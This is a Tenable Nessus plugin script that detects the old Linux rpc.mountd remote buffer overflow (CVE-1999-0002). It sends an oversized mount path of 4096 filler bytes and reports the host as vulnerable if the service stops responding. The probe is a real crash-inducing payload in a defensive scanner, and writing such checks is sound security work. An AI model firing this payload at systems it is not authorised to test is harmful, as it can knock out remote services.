
#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
 script_id(11337);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2017/02/16 21:23:30 $");
 script_cve_id("CVE-1999-0002");
 script_bugtraq_id(121);
 script_osvdb_id(909);
 script_xref(name:"CERT-CC", value:"CA-1998-12");

 script_name(english:"Multiple Linux rpc.mountd Remote Overflow");
 script_summary(english:"Overflows mountd");

 script_set_attribute(
   attribute:"synopsis",
   value:"The remote service has a buffer overflow vulnerability."
 );
 script_set_attribute(attribute:"description",  value:
"The remote mount daemon seems to have a buffer overflow
vulnerability.  A remote attacker could exploit this to
execute arbitrary code as root." );
 script_set_attribute(
   attribute:"solution",
   value:"Consult your vendor for patch or upgrade information."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(119);

 script_set_attribute(attribute:"vuln_publication_date", value:"1998/10/12");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/12");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");

 script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");

 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}



include("misc_func.inc");
include("nfs_func.inc");
include("sunrpc_func.inc");


function naughty_mount(soc, share)
{
  local_var pad, req, len, r, ret, i;

  pad = padsz(len:strlen(this_host_name()));
  len = 52 + strlen(this_host_name()) + pad;

  req = 	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100005) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   rpclong(val:7)  +
		   rpclong(val:0)  +
		   rpclong(val:2)  +
		   rpclong(val:3)  +
		   rpclong(val:4)  +
		   rpclong(val:5)  +
		   rpclong(val:20) +
		   rpclong(val:31) +
		   rpclong(val:0)  +
		   rpclong(val:0)  +
		   rpclong(val:0)  +

		   rpclong(val:strlen(share)) +
		   share +
		   rpcpad(pad:padsz(len:strlen(share)));

  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  if(!r) return 0;
  else return 1;
}

port = get_rpc_port2(program:100005, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
if (! get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open.");

soc = open_priv_sock_udp(dport:port);
if(!soc)exit(0);

if(naughty_mount(soc:soc, share:"/nessus") != 0)
{
 naughty_mount(soc:soc, share:"/" + crap(4096));
 sleep(1);
 if(naughty_mount(soc:soc, share:"/nessus") == 0)
  security_hole(port:port, proto:"udp");
}
